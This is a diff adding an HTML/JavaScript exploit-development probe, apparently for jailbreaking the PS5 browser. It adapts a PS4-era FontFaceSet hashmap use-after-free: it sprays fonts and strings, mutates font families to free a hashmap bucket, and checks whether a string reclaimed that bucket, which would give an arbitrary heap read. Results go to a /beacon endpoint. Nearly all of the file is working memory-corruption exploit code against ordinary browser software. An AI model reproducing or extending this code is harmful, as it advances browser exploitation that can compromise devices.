@@ -1,0 +1,166 @@
+<!--
+  p617: FontFaceSet hashmap string overlap (sleirsgoevy technique).
+
+  The PS4 9.00 exploit uses FontFaceSet internal hashmap corruption:
+  1. Create FontFaceSet with N fonts → internal hashmap allocated
+  2. Spray strings of size HASHMAP_BUCKET
+  3. Mutate font.family → FontFaceSet rehashes, old bucket freed
+  4. String reclaims freed bucket → string content overlaps hashmap data
+  5. Read via charCodeAt → arbitrary heap read
+
+  On PS5 14.10:
+  - SIZEOF_CSS_FONT_FACE = 0xC0 (192 bytes, confirmed)
+  - PAGE_SIZE = 16384 (confirmed)
+  - HASHMAP_BUCKET unknown — test several sizes
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p617</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P617-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+function main(){
+b('BOOT');
+
+// === TEST 1: FontFaceSet constructor availability ===
+try{
+  var ff1=new FontFace('t1','local(Arial)',{});
+  var ff2=new FontFace('t2','local(Arial)',{});
+  var ffs=new FontFaceSet([ff1,ff2]);
+  b('FFS-CTOR:YES,size='+ffs.size);
+  // Test iteration
+  var count=0;
+  ffs.forEach(function(){count++;});
+  b('FFS-FOREACH:'+count);
+}catch(e){
+  b('FFS-CTOR:NO:'+e.message);
+}
+
+// === TEST 2: FontFaceSet with many fonts ===
+try{
+  var fonts=[];
+  for(var i=0;i<64;i++){
+    fonts.push(new FontFace('f'+i,'local(Arial)',{}));
+  }
+  var ffs2=new FontFaceSet(fonts);
+  b('FFS-64:size='+ffs2.size);
+}catch(e){
+  b('FFS-64:ERR:'+e.message);
+}
+
+// === TEST 3: String overlap detection ===
+// The technique: create strings of a specific size, then mutate font
+// families to trigger hashmap rehash. If a string's content changes,
+// the freed hashmap bucket was reclaimed by the string.
+
+var SPRAY_FONTS=256;  // smaller than PS4's 0x1000 to avoid OOM
+var STRING_OFFSET=20; // WTF::StringImpl header size
+
+function ptrToString(p){
+  var s='';
+  for(var i=0;i<8;i++){
+    s+=String.fromCharCode(p%256);
+    p=(p-p%256)/256;
+  }
+  return s;
+}
+
+function stringToPtr(s,o){
+  if(o===undefined)o=0;
+  var ans=0;
+  for(var i=7;i>=0;i--)
+    ans=256*ans+s.charCodeAt(o+i);
+  return ans;
+}
+
+// Try multiple bucket sizes to find the right one
+var BUCKET_SIZES=[160,176,192,208,224,240,256];
+var string_id=10000000;
+var string_atomifier={};
+
+function mkString(l,head){
+  var s=head+'\u0000'.repeat(Math.max(0,l-STRING_OFFSET-8-head.length))+(string_id++);
+  string_atomifier[s]=1;
+  return s;
+}
+
+// For each bucket size, try the overlap
+for(var bi=0;bi<BUCKET_SIZES.length;bi++){
+  var BUCKET=BUCKET_SIZES[bi];
+
+  try{
+    var bad_fonts=[];
+    for(var i=0;i<SPRAY_FONTS;i++){
+      bad_fonts.push(new FontFace('font'+i,'local(Arial)',{}));
+    }
+
+    // Create sentinel string content
+    var sentinel=ptrToString(0xDEADBEEF41414141);
+    for(var i=0;i<256;i++){
+      mkString(BUCKET,sentinel);
+    }
+
+    // Create FontFaceSet
+    var ffs3=new FontFaceSet(bad_fonts);
+
+    // Create the probe string AFTER the FontFaceSet (so it might reclaim)
+    var probe=mkString(BUCKET,sentinel);
+
+    // Now mutate font families to trigger rehash
+    var changed=false;
+    for(var i=0;i<SPRAY_FONTS;i++){
+      bad_fonts[i].family='evil'+i;
+      // Check if probe string changed
+      if(probe.substr(0,sentinel.length)!==sentinel){
+        b('OVERLAP:bucket='+BUCKET+',font='+i);
+        // Dump first 64 bytes of the corrupted string
+        var dump='';
+        for(var j=0;j<Math.min(64,probe.length);j++){
+          var c=probe.charCodeAt(j);
+          dump+=('0000'+c.toString(16)).slice(-4)+' ';
+          if(j%8===7)dump+='| ';
+        }
+        b('DUMP:'+dump.substring(0,500));
+        changed=true;
+        break;
+      }
+    }
+    if(!changed){
+      b('NO-OVERLAP:bucket='+BUCKET);
+    }
+  }catch(e){
+    b('BUCKET-'+BUCKET+':ERR:'+e.message);
+  }
+}
+
+// === TEST 4: document.fonts behavior ===
+try{
+  b('DOC-FONTS:type='+typeof document.fonts);
+  b('DOC-FONTS:ctor='+(document.fonts.constructor.name||'unknown'));
+  b('DOC-FONTS:size='+document.fonts.size);
+  // Check if we can add and then check fonts
+  var tf=new FontFace('probe_font','local(Arial)',{});
+  document.fonts.add(tf);
+  b('DOC-FONTS:after-add='+document.fonts.size);
+  document.fonts.delete(tf);
+  b('DOC-FONTS:after-del='+document.fonts.size);
+}catch(e){
+  b('DOC-FONTS:ERR:'+e.message);
+}
+
+// === TEST 5: String internals probe ===
+// Check if WTF::String stores 8-bit or 16-bit data
+try{
+  var s1='hello';
+  var s2='Ātest';
+  b('STR-ASCII:len='+s1.length+',c0='+s1.charCodeAt(0));
+  b('STR-WIDE:len='+s2.length+',c0='+s2.charCodeAt(0));
+}catch(e){
+  b('STR:ERR:'+e.message);
+}
+
+b('DONE');
+}
+
+setTimeout(main,0);
+</script></head><body>p617</body></html>
